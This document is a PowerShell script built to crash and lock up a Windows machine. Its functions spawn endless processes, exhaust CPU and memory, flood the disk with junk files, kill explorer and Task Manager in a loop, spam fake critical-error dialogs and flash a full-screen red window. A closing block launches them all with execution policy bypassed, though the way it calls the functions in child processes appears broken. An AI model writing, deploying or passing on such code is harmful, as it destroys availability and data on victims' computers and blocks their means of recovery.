$wshell = New-Object -ComObject WScript.Shell

function Open-EndlessPrograms {
    while ($true) {
        Start-Process notepad
        Start-Process cmd
        Start-Process explorer
        Start-Process calc
        Start-Process mspaint
        Start-Process write
        Start-Process powershell
    }
}

function Overload-CPU {
    while ($true) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { while (`$true) { 1..1000000 | % { [math]::Pow(`$_, 2) } } }"
    }
}

function Overload-RAM {
    $array = @()
    while ($true) {
        $array += , (New-Object byte[] (500MB))  # Consumes 500MB per loop
    }
}

function Spam-ErrorMessages {
    while ($true) {
        [System.Windows.Forms.MessageBox]::Show("CRITICAL ERROR: SYSTEM OVERLOAD!", "Windows Error", 0, 16)
    }
}

function Flood-Disk {
    while ($true) {
        $file = "C:\Temp\Crash" + (Get-Random -Minimum 1 -Maximum 999999) + ".txt"
        "MASSIVE SYSTEM FAILURE" * 1000000 | Out-File -FilePath $file
    }
}

function Disable-UI {
    while ($true) {
        Stop-Process -Name explorer -Force
        Stop-Process -Name taskmgr -Force
    }
}

function Glitch-Screen {
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        $form = New-Object System.Windows.Forms.Form
        $form.BackColor = "Red"
        $form.WindowState = "Maximized"
        $form.TopMost = $true
        $form.FormBorderStyle = "None"
        $form.Show()
        Start-Sleep -Milliseconds 20
        $form.Close()
    }
}

# RUN ALL CHAOTIC FUNCTIONS IMMEDIATELY
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Open-EndlessPrograms }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-CPU }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-RAM }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Spam-ErrorMessages }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Flood-Disk }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Disable-UI }"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Glitch-Screen }"

while ($true) { Start-Sleep 1 }
